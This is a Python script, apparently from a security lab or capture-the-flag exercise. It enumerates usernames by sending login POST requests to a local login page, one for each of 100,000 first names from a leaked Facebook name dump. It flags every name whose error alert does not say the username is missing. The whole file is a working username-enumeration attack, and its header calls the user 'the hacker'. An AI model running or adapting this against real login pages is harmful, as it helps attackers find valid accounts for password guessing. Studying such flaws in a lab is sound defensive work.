#!/usr/bin/env python3
#
# This script uses the first 100k facebook names from the
# facebook dump to find available passwords.
#
# This script uses BeautifulSoup, a python HTML parser, to
# get information from the HTML returned by the POST request.
# For each username, a POST request is made to the server.
# The response HTML is then parsed and the text of the alert
# is captured. If the text does not contain the string
# 'Username does not exist', if an exception occurred, or if
# the alert HTML element was not present, then the username
# is considered to possibly be active.
#
# After checking all 100k names, the possibly valid names are
# all printed, and the script terminates. The hacker can then
# proceed to manually check which of the output names are
# valid.
#
# The reason this script considers usernames to only possibly
# be valid is because it was written prior to knowing exactly
# what alert text would indicate the user was valid.

import requests
import json
from bs4 import BeautifulSoup

with open('facebook-firstnames-first-100k.txt') as f:
    usernames = [line.rstrip() for line in f]

url = 'http://localhost:5000/login'
print(f'Making POST requests to {url}')

possibly_worked = []

for username in usernames:
    data = {
        'username': username,
        'password': 'probablynotarealpassword'
    }

    res = requests.post(url, data=data)

    if res.status_code > 299:
        print(f'Received non-2XX status code: {res.status_code}')
        print('This may or may not mean success')
        possibly_worked.append(username)
        continue

    soup = BeautifulSoup(res.text, 'html.parser')
    alerts = soup.findAll('div', {'class': 'alert alert-info'})

    if len(alerts) < 1:
        print('The alert for incorrect username not found')
        print('This may or may not mean success')
        possibly_worked.append(username)
        continue

    alert = alerts[0]

    try:
        alert_text = alert.contents[2].strip().lower()
    except Exception as e:
        print('An exception occurred:')
        print(e)
        print('This may or may not mean success')
        possibly_worked.append(username)
        continue

    if 'username does not exist' not in alert_text:
        print('The alert exists but is not an alert about the username not existing')
        print('This may or may not mean success')
        possibly_worked.append(username)
    else:
        print(f'Username "{username}" not present.')

if len(possibly_worked) < 1:
    print('No possibly working usernames found.')
    exit(1)

print()
print()
print('The following usernames might work:')
for username in possibly_worked:
    print(username)

print('\nExiting.')
exit(0)
